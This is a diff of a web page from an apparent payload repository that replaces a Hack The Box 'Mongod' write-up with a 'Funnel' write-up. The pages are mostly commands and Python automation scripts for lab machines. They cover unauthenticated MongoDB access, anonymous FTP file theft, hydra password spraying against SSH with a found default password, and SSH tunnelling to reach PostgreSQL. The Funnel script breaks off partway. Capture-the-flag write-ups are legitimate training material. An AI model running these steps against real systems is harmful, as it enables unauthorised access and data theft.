@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://github.com/InfoSec-DB/CyberDepot/htb/starting_point/htb_mongod/">
+        <link rel="canonical" href="https://github.com/InfoSec-DB/CyberDepot/htb/starting_point/htb_Funnel/">
       
       
-        <link rel="prev" href="../../../wifi_hacking/wifi_exploits/">
+        <link rel="prev" href="../htb_Synced/">
       
       
-        <link rel="next" href="../htb_Bike/">
+        <link rel="next" href="../../retired_machines/retired1/">
       
       
       <link rel="icon" href="../../../img/favicon.ico">
@@ -22,7 +22,7 @@
     
     
       
-        <title>Hack The Box - Mongod Writeup - CyberDepot - Payload Repository</title>
+        <title>HTB Funnel Writeup - CyberDepot - Payload Repository</title>
       
     
     
@@ -76,7 +76,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#hack-the-box-mongod-writeup" class="md-skip">
+        <a href="#htb-funnel-writeup" class="md-skip">
           Skip to content
         </a>
       
@@ -111,7 +111,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Hack The Box - Mongod Writeup
+              HTB Funnel Writeup
             
           </span>
         </div>
@@ -586,19 +586,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../htb_mongod/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -608,7 +599,6 @@
   
 
       </a>
-      
     </li>
   
 
@@ -662,10 +652,31 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../htb_Funnel/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    HTB Funnel Writeup
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -675,6 +686,137 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap Scan
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Nmap Scan">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#results" class="md-nav__link">
+    <span class="md-ellipsis">
+      Results:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-ftp-anonymous-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploiting FTP (Anonymous Access)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#password-spraying-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      Password Spraying SSH
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#local-port-enumeration-postgresql-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      Local Port Enumeration (PostgreSQL Discovery)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssh-tunneling-to-expose-postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSH Tunneling to Expose PostgreSQL
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#interacting-with-postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Interacting with PostgreSQL
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#automation-script-poc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Automation Script (PoC)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -808,128 +950,129 @@
   
 
 
-<h1 id="hack-the-box-mongod-writeup">Hack The Box - Mongod Writeup</h1>
-<h1 id="overview">🔥 Overview</h1>
-<p><strong>Machine Name:</strong> Mongod<br />
-<strong>Difficulty:</strong> Easy<br />
-<strong>Vulnerability:</strong> MongoDB Misconfiguration<br />
-<strong>Attack Vector:</strong> Unauthenticated Database Access<br />
-<strong>Technology Stack:</strong> MongoDB NoSQL Database (TCP:27017)  </p>
-<hr />
-<h2 id="target-enumeration-recon">🎯 <strong>Target Enumeration &amp; Recon</strong></h2>
-<h1 id="1-nmap-scan"><strong>1️⃣ Nmap Scan</strong></h1>
-<p>We start with an <strong>Nmap</strong> scan to identify open ports and services running on the target machine:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.107.200
+<h1 id="htb-funnel-writeup">HTB Funnel Writeup</h1>
+<h2 id="introduction">Introduction</h2>
+<p>The <strong>Funnel</strong> machine in Hack The Box (HTB) demonstrates the importance of secure network practices and how attackers can exploit weak configurations. This write-up covers <strong>FTP enumeration, password spraying, SSH tunneling, and PostgreSQL exploitation</strong> to retrieve the final flag.</p>
+<h2 id="enumeration"><strong>Enumeration</strong></h2>
+<h3 id="nmap-scan"><strong>Nmap Scan</strong></h3>
+<p>We start by scanning the target IP using <code>nmap</code> to identify open ports and running services.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>--min-rate<span class="o">=</span><span class="m">1000</span><span class="w"> </span>-oA<span class="w"> </span>TunnelScan<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.228.195<span class="w"> </span>-Pn
 </code></pre></div>
-<p><strong>Results:</strong>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>PORT      STATE SERVICE    VERSION
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>27017/tcp open  mongodb    MongoDB 3.6.8
-</code></pre></div>
-MongoDB is running on <strong>port 27017</strong>, and based on the <strong>version (3.6.8)</strong>, it might be <strong>misconfigured</strong>.</p>
-<hr />
-<h1 id="exploitation-unauthenticated-mongodb-access">🚀 <strong>Exploitation: Unauthenticated MongoDB Access</strong></h1>
-<p>MongoDB sometimes allows <strong>unauthenticated access</strong>, meaning we can connect and extract information <strong>without credentials</strong>.</p>
-<h1 id="2-connecting-to-mongodb"><strong>2️⃣ Connecting to MongoDB</strong></h1>
-<p>We use <code>mongosh</code> (MongoDB shell) to check if we have direct access:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>mongosh<span class="w"> </span>mongodb://10.129.107.200:27017
-</code></pre></div>
-<p>If we connect successfully, we can list the available databases:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nx">show</span><span class="w"> </span><span class="nx">dbs</span><span class="p">;</span>
-</code></pre></div>
-<p><strong>Output:</strong>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>admin                  32.00 KiB
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>config                 72.00 KiB
-<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>local                  72.00 KiB
-<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>sensitive_information  32.00 KiB
-<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>users                  32.00 KiB
-</code></pre></div></p>
-<p>The <strong><code>sensitive_information</code></strong> database seems interesting.</p>
-<hr />
-<h1 id="extracting-the-flag">🎯 <strong>Extracting the Flag</strong></h1>
-<p>Let's switch to the <strong>sensitive_information</strong> database and list its collections:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nx">use</span><span class="w"> </span><span class="nx">sensitive_information</span><span class="p">;</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nx">show</span><span class="w"> </span><span class="nx">collections</span><span class="p">;</span>
-</code></pre></div>
-<p><strong>Output:</strong>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>flag
-</code></pre></div></p>
-<p>We extract the data:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nx">db</span><span class="p">.</span><span class="nx">flag</span><span class="p">.</span><span class="nx">find</span><span class="p">();</span>
-</code></pre></div>
-<p><strong>Output:</strong>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">[</span>
-<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span><span class="p">{</span>
-<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span><span class="nt">&quot;_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="err">Objec</span><span class="kc">t</span><span class="err">Id(</span><span class="s2">&quot;630e3dbcb82540ebbd1748c5&quot;</span><span class="err">)</span><span class="p">,</span>
-<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span><span class="nt">&quot;flag&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1b6e6fb359e7c40241b6d431427ba6ea&quot;</span>
-<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">  </span><span class="p">}</span>
-<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="p">]</span>
-</code></pre></div></p>
-<p>✅ <strong>FLAG FOUND:</strong> <code>1b6e6fb359e7c40241b6d431427ba6ea</code></p>
-<hr />
-<h1 id="automating-the-exploit">🔥 <strong>Automating the Exploit</strong></h1>
-<p>Instead of doing this manually, we created a Python exploit:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
-<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
-<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
-<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
-<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">TARGET_IP</span> <span class="o">=</span> <span class="s2">&quot;10.129.107.200&quot;</span>
-<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="n">OUTPUT_FILE</span> <span class="o">=</span> <span class="s2">&quot;mongo_output.json&quot;</span>
-<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
-<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="k">def</span><span class="w"> </span><span class="nf">extract_flag</span><span class="p">():</span>
-<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Connecting to MongoDB and extracting flag...&quot;</span><span class="p">)</span>
-<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>
-<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>    <span class="n">mongosh_commands</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
-<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="s2">    show dbs;</span>
-<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="s2">    use sensitive_information;</span>
-<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="s2">    show collections;</span>
-<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="s2">    db.flag.find();</span>
-<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="s2">    &quot;&quot;&quot;</span>
-<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>
-<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
-<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>        <span class="p">[</span><span class="s2">&quot;mongosh&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;mongodb://</span><span class="si">{</span><span class="n">TARGET_IP</span><span class="si">}</span><span class="s2">:27017&quot;</span><span class="p">,</span> <span class="s2">&quot;--quiet&quot;</span><span class="p">],</span>
-<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>        <span class="nb">input</span><span class="o">=</span><span class="n">mongosh_commands</span><span class="p">,</span>
-<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>        <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
-<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span>
-<a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>    <span class="p">)</span>
-<a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>
-<a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>    <span class="n">output</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-<a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">output</span><span class="p">:</span>
-<a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] No output received from MongoDB.&quot;</span><span class="p">)</span>
-<a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>        <span class="k">return</span>
-<a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>
-<a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">OUTPUT_FILE</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-<a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
-<a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>
-<a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] MongoDB output saved to </span><span class="si">{</span><span class="n">OUTPUT_FILE</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-<a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a>
-<a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a>    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;flag:\s*&#39;([a-f0-9]+)&#39;&quot;</span><span class="p">,</span> <span class="n">output</span><span class="p">)</span>
-<a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a>    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
-<a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a>        <span class="n">flag</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<a id="__codelineno-9-38" name="__codelineno-9-38" href="#__codelineno-9-38"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[✔] FLAG EXTRACTED: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-<a id="__codelineno-9-39" name="__codelineno-9-39" href="#__codelineno-9-39"></a>    <span class="k">else</span><span class="p">:</span>
-<a id="__codelineno-9-40" name="__codelineno-9-40" href="#__codelineno-9-40"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Flag not found.&quot;</span><span class="p">)</span>
-<a id="__codelineno-9-41" name="__codelineno-9-41" href="#__codelineno-9-41"></a>
-<a id="__codelineno-9-42" name="__codelineno-9-42" href="#__codelineno-9-42"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
-<a id="__codelineno-9-43" name="__codelineno-9-43" href="#__codelineno-9-43"></a>    <span class="n">extract_flag</span><span class="p">()</span>
-</code></pre></div>
-<p>Save this script as <code>mongo_pwn.py</code> and run:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>python3<span class="w"> </span>mongo_pwn.py
-</code></pre></div>
-<hr />
-<h1 id="conclusion">🎯 <strong>Conclusion</strong></h1>
-<p>This box demonstrates the <strong>importance of securing MongoDB</strong> against unauthenticated access. The key takeaways:</p>
+<h4 id="results"><strong>Results:</strong></h4>
 <ul>
-<li>Always <strong>require authentication</strong> for databases.</li>
-<li><strong>Disable remote access</strong> if not needed.</li>
-<li><strong>Upgrade MongoDB</strong> to prevent known exploits.</li>
+<li><strong>Port 21</strong> → <code>vsftpd 3.0.3</code> (Anonymous FTP Access)</li>
+<li><strong>Port 22</strong> → <code>OpenSSH 8.2p1</code></li>
+<li><strong>Local Port 5432</strong> → <code>PostgreSQL (Found later via SSH tunneling)</code></li>
 </ul>
-<p>✅ <strong>Mission Accomplished!</strong> 🎉</p>
 <hr />
-<h1 id="afterdark-security">💀 <strong>AfterDark Security</strong></h1>
-<p>Follow <strong>#AfterDark</strong> for more <strong>CTF solutions, pentesting tricks, and cybersecurity research!</strong><br />
-🚀 <strong>GitHub:</strong> [Your Repo Link]<br />
-🐦 <strong>Twitter:</strong> [Your Twitter Handle]  </p>
+<h2 id="exploiting-ftp-anonymous-access"><strong>Exploiting FTP (Anonymous Access)</strong></h2>
+<p>We connect to FTP as an <strong>anonymous user</strong> and check available files.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>ftp<span class="w"> </span><span class="m">10</span>.129.228.195
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1"># Login as anonymous</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>ls
+</code></pre></div>
+<p>Found directory <strong><code>mail_backup</code></strong> containing:
+- <code>welcome_28112022</code>
+- <code>password_policy.pdf</code></p>
+<p>We download these files:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">cd</span><span class="w"> </span>mail_backup
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>get<span class="w"> </span>welcome_28112022
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>get<span class="w"> </span>password_policy.pdf
+</code></pre></div>
+<p>From the <strong>welcome_28112022</strong> file, we extract possible usernames:
+- <code>optimus@funnel.htb</code>
+- <code>albert@funnel.htb</code>
+- <code>andreas@funnel.htb</code>
+- <strong><code>christine@funnel.htb</code></strong> (did not change password)
+- <code>maria@funnel.htb</code></p>
+<p>From <code>password_policy.pdf</code>, we find a <strong>default password</strong>:<br />
+<strong><code>funnel123#!#</code></strong></p>
 <hr />
+<h2 id="password-spraying-ssh"><strong>Password Spraying SSH</strong></h2>
+<p>Using <code>hydra</code>, we attempt password spraying against the SSH service.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>hydra<span class="w"> </span>-L<span class="w"> </span>usernames.txt<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;funnel123#!#&#39;</span><span class="w"> </span><span class="m">10</span>.129.228.195<span class="w"> </span>ssh
+</code></pre></div>
+<p>Successful login found for:<br />
+<strong><code>christine:funnel123#!#</code></strong></p>
+<p>We log in:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ssh<span class="w"> </span>christine@10.129.228.195
+</code></pre></div>
+<hr />
+<h2 id="local-port-enumeration-postgresql-discovery"><strong>Local Port Enumeration (PostgreSQL Discovery)</strong></h2>
+<p>After gaining access, we check for locally running services:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ss<span class="w"> </span>-tl
+</code></pre></div>
+<p>We find <strong>PostgreSQL (port 5432) is listening locally</strong>.</p>
+<hr />
+<h2 id="ssh-tunneling-to-expose-postgresql"><strong>SSH Tunneling to Expose PostgreSQL</strong></h2>
+<p>We set up an SSH tunnel to forward <strong>local port 1234 → remote port 5432</strong>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">1234</span>:localhost:5432<span class="w"> </span>christine@10.129.228.195
+</code></pre></div>
+<p>We verify the connection:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p<span class="w"> </span><span class="m">1234</span><span class="w"> </span>localhost
+</code></pre></div>
+<hr />
+<h2 id="interacting-with-postgresql"><strong>Interacting with PostgreSQL</strong></h2>
+<p>We install the PostgreSQL client on our local machine.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>postgresql-client
+</code></pre></div>
+<p>Connect using <code>psql</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>psql<span class="w"> </span>-h<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">1234</span><span class="w"> </span>-U<span class="w"> </span>christine
+</code></pre></div>
+<p>List available databases:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="err">\</span><span class="n">list</span>
+</code></pre></div>
+<p>Connect to the <code>secrets</code> database:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="err">\</span><span class="k">c</span><span class="w"> </span><span class="n">secrets</span>
+</code></pre></div>
+<p>Check for tables:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="err">\</span><span class="n">dt</span>
+</code></pre></div>
+<p>Retrieve the <strong>flag</strong>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span><span class="p">;</span>
+</code></pre></div>
+<p><strong>FLAG:</strong> <code>cf277664b1771217d7006acdea00****</code></p>
+<hr />
+<h2 id="automation-script-poc"><strong>Automation Script (PoC)</strong></h2>
+<p>Below is a Python script that automates the entire process.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">paramiko</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">psycopg2</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">ftplib</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="n">TARGET_IP</span> <span class="o">=</span> <span class="s2">&quot;10.129.228.195&quot;</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="n">FTP_DIR</span> <span class="o">=</span> <span class="s2">&quot;mail_backup&quot;</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="n">USERNAME</span> <span class="o">=</span> <span class="s2">&quot;christine&quot;</span>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="n">PASSWORD</span> <span class="o">=</span> <span class="s2">&quot;funnel123#!#&quot;</span>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="n">LOCAL_PORT</span> <span class="o">=</span> <span class="mi">1234</span>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="n">REMOTE_PORT</span> <span class="o">=</span> <span class="mi">5432</span>
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="k">def</span><span class="w"> </span><span class="nf">ftp_download</span><span class="p">():</span>
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>    <span class="n">ftp</span> <span class="o">=</span> <span class="n">ftplib</span><span class="o">.</span><span class="n">FTP</span><span class="p">(</span><span class="n">TARGET_IP</span><span class="p">)</span>
+<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>    <span class="n">ftp</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s2">&quot;anonymous&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>    <span class="n">ftp</span><span class="o">.</span><span class="n">cwd</span><span class="p">(</span><span class="n">FTP_DIR</span><span class="p">)</span>
+<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>    <span class="n">ftp</span><span class="o">.</span><span class="n">retrbinary</span><span class="p">(</span><span class="s2">&quot;RETR welcome_28112022&quot;</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;welcome_28112022&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">)</span>
+<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>    <span class="n">ftp</span><span class="o">.</span><span class="n">retrbinary</span><span class="p">(</span><span class="s2">&quot;RETR password_policy.pdf&quot;</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;password_policy.pdf&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">)</span>
+<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>    <span class="n">ftp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
+<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>
